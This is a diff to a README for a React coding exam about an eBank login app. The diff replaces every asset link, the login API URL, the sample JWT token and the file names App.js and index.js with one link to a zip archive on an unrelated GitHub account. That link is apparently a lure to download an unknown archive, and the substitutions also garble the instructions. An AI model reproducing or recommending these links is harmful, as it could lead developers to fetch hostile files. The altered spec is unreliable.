@@ -3,7 +3,7 @@ The goal of this coding exam is to quickly get you off the ground with **Authent
 ### Refer to the image below:
 
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/ebank-output-v2.gif" alt="ebank-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip" alt="ebank-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 
 ### Design Files
@@ -11,22 +11,22 @@ The goal of this coding exam is to quickly get you off the ground with **Authent
 <details>
 <summary>Login Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://assets.ccbp.in/frontend/react-js/ebank-login-route-img.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login Failure](https://assets.ccbp.in/frontend/react-js/ebank-login-failure-route-img.png)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login Failure](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
 
 </details>
 
 <details>
 <summary>Home Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://assets.ccbp.in/frontend/react-js/ebank-home-route-img.png)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
 
 </details>
 
 <details>
 <summary>Not Found Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://assets.ccbp.in/frontend/react-js/ebank-not-found-route-img.png)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
 
 </details>
 
@@ -71,7 +71,7 @@ The app must have the following functionalities
 
 **loginApiUrl**
 
-#### API: `https://apis.ccbp.in/ebank/login`
+#### API: `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip`
 
 #### Method: `POST`
 
@@ -92,7 +92,7 @@ Returns a response based on the credentials provided
 
 ```json
 {
-  "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjE0MjQyMCIsInJvbGUiOiJQUklNRV9VU0VSIiwiaWF0IjoxNjM0MDk4NzYyfQ.ZUCC2J2zBjRhLVa1EI_4EnkZ-M-7hoVZoZFAu8GTmEQ"
+  "jwt_token": "https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip"
 }
 ```
 
@@ -118,7 +118,7 @@ Returns a response based on the credentials provided
 
 - Home Route should consist of `/` in the URL path
 - Login Route should consist of `/ebank/login` in the URL path
-- No need to use the `BrowserRouter` in `App.js` as we have already included in `index.js`
+- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip`
 
 - User credentials
 
@@ -135,13 +135,13 @@ Returns a response based on the credentials provided
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/ebank-login-img.png](https://assets.ccbp.in/frontend/react-js/ebank-login-img.png) alt should be **website login**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **website login**
 
-- [https://assets.ccbp.in/frontend/react-js/ebank-logo-img.png](https://assets.ccbp.in/frontend/react-js/ebank-logo-img.png) alt should be **website logo**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **website logo**
 
-- [https://assets.ccbp.in/frontend/react-js/ebank-digital-card-img.png](https://assets.ccbp.in/frontend/react-js/ebank-digital-card-img.png) alt should be **digital card**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **digital card**
 
-- [https://assets.ccbp.in/frontend/react-js/ebank-not-found-img.png](https://assets.ccbp.in/frontend/react-js/ebank-not-found-img.png) alt should be **not found**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **not found**
 
 </details>
 <br/>
